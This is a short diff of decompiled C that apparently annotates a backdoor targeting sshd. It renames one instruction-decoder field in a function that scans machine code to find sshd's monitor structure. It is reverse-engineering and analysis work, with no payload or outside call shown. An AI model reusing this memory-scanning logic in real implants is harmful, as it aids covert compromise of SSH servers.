@@ -54,7 +54,7 @@ BOOL sshd_find_monitor_field_addr_in_function
         if ((insn_ctx.prefix.flags_u16 & 0x40) == 0) {
           tracked_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
           if (((insn_ctx.prefix.flags_u16 & 0x1000) != 0) &&
-             (tracked_reg = insn_ctx.imm64_reg, (insn_ctx.prefix.flags_u16 & 0x20) != 0)) {
+             (tracked_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u16 & 0x20) != 0)) {
             rex_extension = (char)insn_ctx.prefix.decoded.rex << 3;
             goto LAB_001030d4;
           }
@@ -93,8 +93,8 @@ LAB_00103110:
               else if ((insn_ctx.prefix.flags_u16 & 0x40) == 0) {
                 candidate_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
                 if (((insn_ctx.prefix.flags_u16 & 0x1000) != 0) &&
-                   (candidate_reg = insn_ctx.imm64_reg, (insn_ctx.prefix.flags_u16 & 0x20) != 0)) {
-                  candidate_reg = insn_ctx.imm64_reg | ((byte)insn_ctx.prefix.decoded.rex & 1) << 3;
+                   (candidate_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u16 & 0x20) != 0)) {
+                  candidate_reg = insn_ctx.mov_imm_reg_index | ((byte)insn_ctx.prefix.decoded.rex & 1) << 3;
                 }
               }
               else {
@@ -112,7 +112,7 @@ LAB_00103237:
             else if (*(u32 *)&insn_ctx.opcode_window[3] == 0x10b) {
               if ((insn_ctx.prefix.flags_u16 & 0x40) == 0) {
                 if ((insn_ctx.prefix.flags_u16 & 0x1040) != 0) {
-                  rex_extension = insn_ctx.imm64_reg;
+                  rex_extension = insn_ctx.mov_imm_reg_index;
                   if ((insn_ctx.prefix.flags_u16 & 0x1000) != 0) goto LAB_00103237;
                   mirrored_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
                   if (tracked_reg != candidate_reg) goto LAB_0010325f;
